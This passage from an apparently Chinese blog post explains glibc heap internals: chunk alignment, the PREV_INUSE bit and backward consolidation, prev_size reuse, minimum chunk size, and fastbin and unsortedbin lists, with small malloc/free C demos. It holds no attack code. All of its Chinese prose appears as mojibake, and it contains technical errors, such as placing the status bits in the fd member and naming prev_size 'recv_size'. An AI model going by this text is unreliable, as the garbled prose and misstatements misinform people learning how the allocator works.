<li><strong>åœ¨64ä½ç³»ç»Ÿä¸­ä¸º16å­—èŠ‚å¯¹é½</strong>ï¼Œ<strong>åœ¨32ä½çš„ç³»ç»Ÿä¸­ä¸º8å­—èŠ‚å¯¹é½</strong>ã€‚å› æ­¤åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œstruct malloc_chunkç»“æ„ä½“çš„å¤§å°çš„æœ€å4ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ï¼Œ32ä½ç³»ç»Ÿä¸­ï¼Œæœ€å3ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ã€‚</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/2019072217303470.png" alt="img"></p>
<ul>
<li>æ‰€ä»¥ï¼Œglibcç”¨struct malloc_chunkç»“æ„ä½“çš„fdæˆå‘˜çš„æœ€å3ä¸ªæ¯”ç‰¹ä½æ¥è¡¨ç¤ºå½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€ã€‚åªéœ€è¦å°†fdæˆå‘˜ç›¸åº”çš„æ¯”ç‰¹ä½ç½®ä¸º1ï¼Œå°±å¯ä»¥ä»£è¡¨å½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€</li>
</ul>
<h4 id="3-PREV-INUSEä½å¯¼è‡´çš„chunkåˆå¹¶"><a href="#3-PREV-INUSEä½å¯¼è‡´çš„chunkåˆå¹¶" class="headerlink" title="3.PREV_INUSEä½å¯¼è‡´çš„chunkåˆå¹¶"></a>3.PREV_INUSEä½å¯¼è‡´çš„chunkåˆå¹¶</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>é¦–å…ˆä½¿ç”¨prev_inuseå®å®šä¹‰åˆ¤æ–­pçš„PREV_INUSEä½æ˜¯å¦ä¸º0</li>
<li>å¦‚æœPREV_INUSEä½ä¸º0ï¼Œé‚£ä¹ˆprev_inuseå®è¿”å›0ï¼Œifæ¡ä»¶ä¸º1ï¼Œè¿›å…¥ifè¯­å¥ä½“ä¸­</li>
<li>1.é€šè¿‡recv_sizeå‡½æ•°å¾—åˆ°å‰é¢è¦åˆå¹¶çš„chunkçš„å¤§å°</li>
<li>2.å°†è‡ªå·±çš„å¤§å°ä¸å‰é¢çš„presizeç›¸åŠ å¾—åˆ°åˆå¹¶åçš„chunkçš„å¤§å°</li>
<li>3.å°†pçš„æŒ‡é’ˆå‘å‰ç§»åŠ¨ï¼Œç§»åŠ¨åˆ°å‰é¢é‚£ä¸ªchunkçš„å¼€å¤´å¤„</li>
<li>4.unlinkæ˜¯å°†ä¸¤ä¸ªè¦åˆå¹¶çš„chunkå„è‡ªä»åŸæ¥çš„biné“¾ä¸Šé¢æ–­ä¸‹æ¥ï¼Œç„¶åè¿›è¡Œåˆå¹¶</li>
</ul>
<h4 id="4-fast-chunkçš„PREV-INUSE"><a href="#4-fast-chunkçš„PREV-INUSE" class="headerlink" title="4.fast chunkçš„PREV_INUSE"></a>4.fast chunkçš„PREV_INUSE</h4><ul>
<li>â‘ æ— è®ºfastchunkå‰é¢çš„chunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼ŒPREV_INUSEå§‹ç»ˆä¸º1ã€‚å› ä¸ºç³»ç»Ÿä¸å¸Œæœ›fastchunkä¸å‰é¢çš„chunkä¹‹é—´è¿›è¡Œåˆå¹¶</li>
<li>â‘¡ä¸è®ºå½“å‰çš„fastchunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼Œè¯¥chunkåé¢çš„chunkçš„PREV_INUSEä½ä¸€å®šä¸º1ï¼Œä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢åé¢çš„chunkä¸fastchunkåˆå¹¶</li>
</ul>
<h4 id="5-æ¼”ç¤º"><a href="#5-æ¼”ç¤º" class="headerlink" title="5.æ¼”ç¤º"></a>5.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x70</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢åˆå¹¶åçš„chunkä¸top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ­£å¥½åˆ†é…äº†3å—</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214183532647.png" alt="image-20201214183532647"></p>
<p>çœ‹ä¸€ä¸‹å†…å­˜åœ°å€</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214183701946.png" alt="image-20201214183701946"></p>
<p>å½“æˆ‘ä»¬é‡Šæ”¾ä¸€ä¸ªä¹‹å</p>
<p>è¿™é‡Œç‰ˆæœ¬è¾ƒé«˜  æ·¦ æˆ‘å…ˆå»æ‰¾ä¸ªè™šæ‹Ÿæœº</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯åŠ åˆ°tcacheä¸­</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214183930779.png" alt="image-20201214183930779"></p>
<hr>
<p>å¼„äº†ä¸€æ™šä¸Š æˆ‘åˆå›æ¥äº†</p>
<p>é‡Šæ”¾ç¬¬ä¸€ä¸ª</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214221400402.png" alt="image-20201214221400402"></p>
<p>é‡Šæ”¾ä¸¤ä¸ª</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214221458119.png" alt="image-20201214221458119"></p>
<h3 id="0x08-chunkçš„mchunk-prev-sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨"><a href="#0x08-chunkçš„mchunk-prev-sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨" class="headerlink" title="0x08 chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨"></a>0x08 chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨</h3><h4 id="1-ä»‹ç»"><a href="#1-ä»‹ç»" class="headerlink" title="1.ä»‹ç»"></a>1.ä»‹ç»</h4><ul>
<li>â‘ å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºç©ºé—²çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜æ‰æœ‰ç”¨ï¼Œæ­¤æ—¶ç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunkçš„å¤§å°</li>
<li>â‘¡å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜å¯¹äºæœ¬chunkæ¥è¯´æ˜¯ä¸ä½¿ç”¨çš„</li>
</ul>
<h4 id="2-å®ç°-1"><a href="#2-å®ç°-1" class="headerlink" title="2.å®ç°"></a>2.å®ç°</h4><ul>
<li>å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„æ•°æ®ç©ºé—´ç”³è¯·çš„å¤§å°å¯¹16å–ä½™åï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å°äºç­‰äº8å­—èŠ‚ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤šå‡ºæ¥çš„å¤§å°å°±æ”¾å…¥ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeä¸­å­˜å‚¨</li>
<li>å¦åˆ™ï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å¤§äº8å­—èŠ‚ï¼Œé‚£ä¹ˆå‰ä¸€ä¸ªchunkå°±ä¸ä½¿ç”¨ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190724195005380.png" alt="img"></p>
<h4 id="3-æ¼”ç¤º"><a href="#3-æ¼”ç¤º" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x108</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x108æ¨¡0x10ä¹‹åè¿˜æœ‰8 è¯´æ˜æ˜¯å ç”¨äº†ä¸‹ä¸€ä¸ªchunkçš„pre_size</p>
<p>64ä½16å­—èŠ‚å¯¹é½ 0x100(åˆ†é…)+0x10(å¤´)+0x1(P)</p>
</blockquote>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214190713309.png" alt="image-20201214190713309"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x109</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x109æ¨¡0x10ä¸º9 æ‰€ä»¥pre_sizeä¸å¤Ÿç”¨ éœ€è¦å¤šç”³è¯·1ä¸ªå•å…ƒ</p>
<p>chunkè¢«éšå¼å¯¹é½ä½0x110</p>
<p>64ä½16å­—èŠ‚å¯¹é½ 0x110+0x10+0x1</p>
</blockquote>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214191149578.png" alt="image-20201214191149578"></p>
<h3 id="0x09-chunkçš„å¤§å°"><a href="#0x09-chunkçš„å¤§å°" class="headerlink" title="0x09 chunkçš„å¤§å°"></a>0x09 chunkçš„å¤§å°</h3><p>å…¶å®ä¸Šä¸€èŠ‚æˆ‘ä»¬å°±æ¼”ç¤ºäº† ä½†è¿™ä¸€èŠ‚è¿˜æ˜¯é‡ç‚¹è®²ä¸€ä¸‹</p>
<h4 id="1-chunkçš„å®é™…å¤§å°"><a href="#1-chunkçš„å®é™…å¤§å°" class="headerlink" title="1.chunkçš„å®é™…å¤§å°"></a>1.chunkçš„å®é™…å¤§å°</h4><ul>
<li>å½“ç”¨æˆ·é€šè¿‡mallocå‡½æ•°ç”³è¯·å †å†…å­˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨çš„å†…å­˜çš„èµ·å§‹åœ°å€æ˜¯ä»fdæˆå‘˜å¼€å§‹çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ³•è®¿é—®ç»“æ„ä½“çš„å‰ä¸¤ä¸ªæˆå‘˜</li>
<li>å½“ç”¨æˆ·ç”³è¯·sizeå¤§å°çš„å †å—æ—¶ï¼Œåœ¨glibcä¸­æœ¬è´¨ä¸Šæ˜¯ç”³è¯·äº†size+16å¤§å°ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰çš„å†…å­˜ï¼Œå› ä¸ºè¦åŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜</li>
<li>ä¾‹å¦‚ï¼šmalloc(0x10);ç”³è¯·äº†0x10å¤§å°çš„å †å†…å­˜ï¼Œæœ¬è´¨ä¸Šåœ¨glibcä¸­ç”³è¯·äº†0x10+0x10=0x20å¤§å°çš„ç©ºé—´</li>
<li><strong>chunkçš„å®é™…å¤§å°=mallocçš„å¤§å°+chunkçš„å‰ä¸¤ä¸ªæˆå‘˜+mchunk_prev_sizeæˆå‘˜çš„åˆå¹¶æ“ä½œ+chunkå¯¹é½è§„åˆ™</strong></li>
</ul>
<p>è¿™ä¸ªä¸Šé¢æ¼”ç¤ºè¿‡äº† å°±ä¸æ¼”ç¤ºäº†</p>
<h4 id="2-chunkçš„æœ€ä½å¤§å°"><a href="#2-chunkçš„æœ€ä½å¤§å°" class="headerlink" title="2.chunkçš„æœ€ä½å¤§å°"></a>2.chunkçš„æœ€ä½å¤§å°</h4><ul>
<li>mallocçš„å †å—å¤§å°åœ¨glibcä¸­ä¼šåŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜çš„å¤§å°ï¼ˆ0x10å¤§å°ï¼‰ï¼Œæ‰€ä»¥å½“ä½ åˆ†é…ä¸€ä¸ªå †å†…å­˜æ—¶ï¼Œå †å†…å­˜çš„æœ€å°å¤§å°ä¸€å®šä¸º0x20ï¼ˆ0x10+0x10ï¼‰ã€‚ï¼ˆå³ä½¿mallocæ²¡æœ‰æŒ‡å®šå¤§å°ï¼Œä¹Ÿè¦åˆ†é…fdå’Œbkæˆå‘˜ï¼Œæ‰€ä»¥åŠ èµ·æ¥å°±æ˜¯malloc_chunkç»“æ„ä½“çš„å‰4ä¸ªæˆå‘˜çš„å¤§å°æ€»å’Œï¼‰</li>
<li><strong>chunkçš„æœ€ä½å¤§å°ä¸€å®šä¸º0x20å¤§å°</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//int size=0x109;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214191901328.png" alt="image-20201214191901328"></p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201214191928725.png" alt="image-20201214191928725"></p>
<h3 id="0x10-binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#0x10-binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="0x10 binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>0x10 binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„</h3><h4 id="1-fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#1-fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="1.fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>1.fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„</h4><ul>
<li>fastbinsæ˜¯å•å‘é“¾è¡¨å­˜å‚¨ï¼Œfastbinsä¸­çš„çš„chunkæ˜¯ä¸ä¼šåˆå¹¶çš„ï¼ˆglibcè§„å®šè¿™äº›chunkçš„PREV_INUSEä½æ°¸è¿œä¸º1ï¼‰</li>
</ul>
<blockquote>
<p><strong>å­˜å‚¨ç»“æ„ï¼š</strong></p>
<ul>
<li><strong>fastbinsçš„å­˜å‚¨é‡‡ç”¨åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„åŸåˆ™ï¼š</strong>åfreeçš„chunkä¼šè¢«æ·»åŠ åˆ°å…ˆfreeçš„chunkçš„åé¢ï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå»å–æœ€æ–°æ”¾è¿›å»çš„</li>
<li>å› ä¸ºæ˜¯å•é“¾è¡¨ï¼Œfastbinsä¸­çš„æ‰€æœ‰chunkçš„bkæ˜¯æ²¡æœ‰ç”¨åˆ°çš„</li>
<li>å¹¶ä¸”fastbinsæ¯”è¾ƒç‰¹æ®Šï¼Œä¸€ä¸ªfastbiné“¾ç¬¬ä¸€ä¸ªchunkæŒ‡å‘äºä¸€ä¸ªç‰¹æ®Šçš„â€œ0â€ï¼Œç„¶ååé¢æ¥çš„æ˜¯åfreeçš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œæœ€åä¸€ä¸ªchunkå†ç”±arenaçš„malloc_stateçš„fastbinsYæ•°ç»„æ‰€ç®¡ç†</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215160058074.png" alt="image-20201215160058074"></p>
</blockquote>
<p><strong>æ¼”ç¤º</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ²¡æœ‰å…¶ä»–ä½œç”¨</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ‰“åˆ°æ–­ç‚¹å¤„ heapçš„ä¿¡æ¯</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215160443811.png" alt="image-20201215160443811"></p>
<p>é‡Šæ”¾p1 p2</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215160534048.png" alt="image-20201215160534048"></p>
<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘0 è€Œç¬¬äºŒä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ª</p>
<p>çœ‹ä¸€ä¸‹main_arena å¯ä»¥çœ‹åˆ°æ˜¯æŒ‡å‘æœ€åä¸€ä¸ªchunk ä¹Ÿå°±éªŒè¯äº†ä¸Šé¢çš„ç»“è®º</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215160746395.png" alt="image-20201215160746395"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬é‡Šæ”¾ç¬¬ä¸‰ä¸ª</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215161151487.png" alt="image-20201215161151487"></p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215161023500.png" alt="image-20201215161023500"></p>
<p>ç”±äºä¸å‰ä¸¤ä¸ªå¤§å°ä¸åŒæ‰€ä»¥æˆ‘ä»¬ä¼šæ–°å¼€ä¸€ä¸ªé“¾è¡¨ è¯´æ˜main_arenaçš„åœ°å€ä¹Ÿä¸ä¸€æ ·</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215161240081.png" alt="image-20201215161240081"></p>
<p>æ­¤æ¬¡æ¼”ç¤ºä¹Ÿå°±å®Œæˆäº†</p>
<p>32ä½å¯è‡ªè¡Œæ¼”ç¤º</p>
</blockquote>
<h4 id="2-unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"><a href="#2-unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„" class="headerlink" title="2.unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„"></a>2.unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„</h4><ul>
<li>freeçš„chunkå¤§å°å¦‚æœå¤§äº0x80ä¼šæ”¾åˆ°unsortedbinä¸Š</li>
<li>unsortedbinå­˜å‚¨è¿™äº›chunkæ˜¯ä½¿ç”¨åŒå‘å¾ªç¯é“¾è¡¨è¿›è¡Œå­˜å‚¨çš„ï¼ˆ<strong>smallbinsã€largebinsä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ­¤å¤„åªä»‹ç»unsortedbin</strong>ï¼‰</li>
</ul>
<blockquote>
<p><strong>å­˜å‚¨ç»“æ„</strong>ï¼š</p>
<ul>
<li><strong>å­˜å‚¨å¾ªç¯å…ˆå…¥å…ˆå‡ºï¼ˆFIFOï¼‰åŸåˆ™ï¼š</strong>ä¸Šé¢çš„æ˜¯å…ˆfreeæ‰çš„chunkï¼Œä¸‹é¢æ˜¯åfreeæ‰çš„chunkï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå–ä¸Šé¢çš„ï¼Œå†å–ä¸‹é¢çš„</li>
<li><strong>ä¸€ä¸ªbinsä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼š</strong>å°±æ˜¯ä¸‹é¢è¿™ç§è¡¨ç¤ºå½¢å¼ã€‚å¯ä»¥çœ‹åˆ°freechunkçš„fdå’Œbkéƒ½æŒ‡å‘äºbinsçš„fdï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨gdbè°ƒè¯•æ—¶å¯ä»¥ç”¨å‘½ä»¤çœ‹åˆ°ï¼Œå½“biné“¾ä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼Œå…¶fdå’Œbkéƒ½æ˜¯ç›¸åŒçš„ï¼Œéƒ½æŒ‡å‘äºbinsçš„fd</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190729213257204.png" alt="img"></p>
<ul>
<li><strong>ä¸€ä¸ªbinsä¸­æœ‰å¤šä¸ªfreechunkæ—¶ï¼š</strong>ä¸Šé¢ä½¿æˆ‘ä»¬çš„struct malloc_stateç»“æ„ä½“ï¼Œç»“æ„ä½“ä¸­çš„binsæ•°ç»„å­˜å‚¨çš„å°±æ˜¯è¿™äº›biné“¾ï¼Œä¸‹é¢å°±æ˜¯binsæ•°ç»„ä¸­å­˜å‚¨unsortedbinçš„ä½ç½®ï¼Œè¿™ä¸ªæ•°ç»„å…ƒç´ å­˜å‚¨çš„å…¶å®å°±æ˜¯ä¸€ä¸ªfdå’Œä¸€ä¸ªbkæŒ‡é’ˆã€‚ä¸‹é¢ç¬¬ä¸€ä¸ªå°±æ˜¯ç¬¬ä¸€ä¸ªfreeæ‰çš„chunkï¼Œå†ä¸‹é¢ä¸€ä¸ªå°±æ˜¯ç¬¬äºŒä¸ªfreeæ‰çš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨</li>
</ul>
<p><img src="/2020/12/15/%E5%A0%86/20190729212907497.png" alt="img"></p>
</blockquote>
<p><strong>æ¼”ç¤º</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//é˜²æ­¢p1ä¸p2åˆå¹¶</span></span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//é˜²æ­¢p2è¢«top chunkåˆå¹¶</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ‰“æ–­ç‚¹</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215163335296.png" alt="image-20201215163335296"></p>
<p>é‡Šæ”¾p1</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215163518823.png" alt="image-20201215163518823"></p>
<p>ä»ä¸Šé¢æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸‹ä¸€ä¸ªchunkçš„æ ‡å¿—pä½ä¸º0äº†</p>
<p>çœ‹ä¸‹main_arena</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215163755383.png" alt="image-20201215163755383"></p>
<p>é‡Šæ”¾p2</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215164417439.png" alt="image-20201215164417439"></p>
<p>å¯ä»¥çœ‹åˆ°main_arenaæ˜¯å˜äº†çš„</p>
<p><img src="/2020/12/15/%E5%A0%86/image-20201215165029835.png" alt="image-20201215165029835"></p>
<p>binså¤´ä¸­fd-&gt;p2 bk-&gt;p1</p>
